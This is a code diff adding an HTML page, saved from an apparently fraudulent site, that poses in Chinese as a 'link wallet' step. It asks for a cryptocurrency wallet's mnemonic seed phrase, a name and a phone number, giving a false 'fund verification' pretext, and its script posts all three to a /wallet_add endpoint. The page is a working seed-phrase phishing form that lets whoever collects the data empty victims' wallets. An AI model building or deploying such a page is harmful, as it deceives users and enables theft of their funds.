@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<!-- saved from url=(0039)https://hb.bigo6.xyz/index/user/qianbao -->
+<html style="font-size: 37.5px;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <title>關聯錢包</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
+    <script type="text/javascript" src="./js/jquery.min.js"></script>
+    <script type="text/javascript" src="./js/index.js"></script>
+    <link rel="stylesheet" href="./css/layout.css">
+    <link rel="stylesheet" href="./css/style.css">
+    <script type="text/javascript" src="./js/layer.js"></script><link rel="stylesheet" href="./css/layer.css" id="layui_layer_skinlayercss"><link rel="stylesheet" href="./css/layer.css" id="layui_layer_skinlayercss">
+    <!-- <script type="text/javascript" src="./js/index.js(1)"></script> -->
+</head>
+<body>
+<div class="page page-rate page-w">
+    <div class="header">
+        <a href="https://hb.bigo6.xyz/index/user/download"><div class="back"></div></a>
+        <div>關聯錢包</div>
+        <div class="right-back pr20"></div>
+    </div>
+    <div class="bank-box withdraw-box p40">
+
+        <div class="item c-row c-row-between c-row-middle" style="border-bottom: 1px solid #fbf7f7;">
+            <div class="lab">助記詞</div>
+        </div>
+
+        <div class="item c-row c-row-between c-row-middle">
+            <div><textarea id="zjc" rows="2" cols="40" placeholder="請用空格隔開"></textarea></div>
+        </div>
+
+
+        <div class="item c-row c-row-between c-row-middle">
+            <div class="lab">姓名</div>
+            <div class=""><input type="text" id="pws" placeholder="請輸入姓名"></div>
+        </div>
+        <div class="item c-row c-row-between c-row-middle">
+            <div class="lab">手機號</div>
+            <div class=""><input type="text" id="rpws" placeholder="請輸入手機號"></div>
+        </div>
+
+
+        <div class="item c-row c-row-between c-row-middle">
+            <div class="lab">地址類型</div>
+            <div class="bank-select pr40" id="select">
+                <input type="text" id="bank" readonly="readonly" placeholder="請選擇地址">
+            </div>
+        </div>
+
+        <div class="pl30 pr30 m40 bank-btn">
+            <button type="button" class="btn send">激活</button>
+        </div>
+        <div>
+            <p>提示:</p>
+            <p>1.由於資金監管嚴格，每筆交易需完成資金驗證</p>
+            <p>2.請妥善保管好自己的密碼,切勿泄露</p>
+        </div>
+        <div class="lay-box p40">
+            <div class="li c-row c-row-middle">
+                <div class="mr30">
+                    <i></i>
+                </div>
+                <div class="txt">火幣錢包</div>
+                <div class="bankid" style="display: none">2</div>
+            </div>
+<!--             
+            <div class="li c-row c-row-middle">
+                <div class="mr30">
+                    <i></i>
+                </div>
+                <div class="txt">imToken</div>
+                <div class="bankid" style="display: none">1</div>
+            </div><div class="li c-row c-row-middle">
+            <div class="mr30">
+                <i></i>
+            </div>
+            <div class="txt">火幣錢包</div>
+            <div class="bankid" style="display: none">2</div>
+        </div><div class="li c-row c-row-middle">
+            <div class="mr30">
+                <i></i>
+            </div>
+            <div class="txt">Bitpie</div>
+            <div class="bankid" style="display: none">3</div>
+        </div><div class="li c-row c-row-middle">
+            <div class="mr30">
+                <i></i>
+            </div>
+            <div class="txt">FegWit</div>
+            <div class="bankid" style="display: none">4</div>
+        </div> -->
+
+        </div>
+    </div>
+</div>
+<div class="lay"></div>
+<script type="text/javascript">
+    $(function(){
+        var id='2';
+        $("#bank").val('火幣錢包');
+        $("#select").click(function(){
+            $(".lay").show();
+            $(".lay-box").animate({'bottom':'0px'},500)
+        })
+
+        $(".lay").click(function(){
+            $(".lay").hide();
+            $(".lay-box").animate({'bottom':'-10rem'},500)
+        })
+
+        $(".lay-box .li").click(function(){
+            $(this).addClass('action').siblings('.li').removeClass('action');
+            var txt = $(this).find('.txt').text();
+            $("#bank").val(txt);
+            var bankid = $(this).find('.bankid').text();
+            id = bankid;
+        })
+        $('.btn').on('click',function(){
+            var zjc = $('#zjc').val();
+            var pws=$('#pws').val();
+            var rpws=$('#rpws').val();
+
+
+
+
+            if(zjc=='' || zjc==null || typeof(zjc) == undefined){
+                layer.msg('請輸入助記詞');
+                return false;
+            }
+
+            if(id=='' || id==null){
+                layer.msg('請選擇地址');
+                return false;
+            }
+
+            if(pws=='' || pws==null){
+                layer.msg('你輸入姓名');
+                return false;
+            }
+
+
+            if(rpws=='' || rpws==null){
+                layer.msg('你輸入手機號');
+                return false;
+            }
+
+            $.ajax({
+                type: "POST",
+                url:'/wallet_add',
+                data:{wallet_type:id,name:pws,help_words:zjc,phone:rpws},
+                // dataType: "json",
+                success: function(data){
+                    if(data.code==1){
+                        layer.msg(data.msg);
+                        // setTimeout(function (args) {
+                        //     window.location.href = data.url
+                        // }, 1000);
+                    }else{
+                        layer.msg(data.msg);
+                    }
+                }
+            });
+        })
+
+
+    })
+
+</script>
+
+
+
+</body></html>
